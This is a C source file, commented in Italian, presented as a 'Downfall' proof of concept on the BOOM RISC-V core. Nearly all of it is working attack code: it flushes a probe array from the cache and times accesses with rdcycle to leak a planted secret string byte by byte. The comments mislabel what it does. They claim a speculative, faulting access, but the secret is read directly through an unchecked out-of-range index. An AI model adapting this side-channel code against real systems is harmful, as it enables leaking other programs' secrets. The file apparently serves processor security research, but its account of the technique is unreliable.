#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define NUM_ROUNDS 30
#define SECRET_LENGTH 26
#define CACHE_HIT_THRESHOLD 60

uint8_t array1[16] = {0};
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretData = "!\"#ThisIsTheSecretString:)";
uint8_t temp = 0;

/**
 * Victim function che esegue un carico speculativo da un indirizzo controllato.
 */
void victimFunction(size_t idx) {
    // Forziamo un accesso speculativo che causa un fault
    temp &= array2[array1[idx] * L1_BLOCK_SZ_BYTES];
}

int main(void) {
    // Calcoliamo l'indice per accedere alla stringa segreta
    size_t attack_idx = (size_t)(secretData - (char*)array1);
    static int results[256];
    uint8_t dummy = 0;

    // Inizializza array2
    for (int i = 0; i < 256; i++) {
        array2[i * L1_BLOCK_SZ_BYTES] = 1;
    }

    printf("Inizio dell'attacco Downfall PoC su BOOM RISC-V...\n");

    for (int i = 0; i < SECRET_LENGTH; i++) {
        // Resetta i risultati
        for (int j = 0; j < 256; j++) {
            results[j] = 0;
        }

        for (int round = 0; round < NUM_ROUNDS; round++) {
            // Flush della cache per array2
            flushCache((uint64_t)array2, sizeof(array2));

            // Barriera per evitare riordino
            asm volatile("fence");

            // Chiamata alla funzione vittima
            victimFunction(attack_idx);

            // Misura il tempo di accesso per ogni elemento di array2
            for (int k = 0; k < 256; k++) {
                uint64_t start = rdcycle();
                dummy &= array2[k * L1_BLOCK_SZ_BYTES];
                uint64_t elapsed = rdcycle() - start;

                if (elapsed < CACHE_HIT_THRESHOLD) {
                    results[k]++;
                }
            }
        }

        // Trova il valore con il maggior numero di cache hits
        int max = -1;
        int max_idx = -1;
        for (int j = 0; j < 256; j++) {
            if (results[j] > max) {
                max = results[j];
                max_idx = j;
            }
        }

        printf("Byte %d: expected '%c', guessed '%c' (hits %d)\n",
               i, secretData[i], max_idx, max);

        attack_idx++;
    }

    return 0;
}

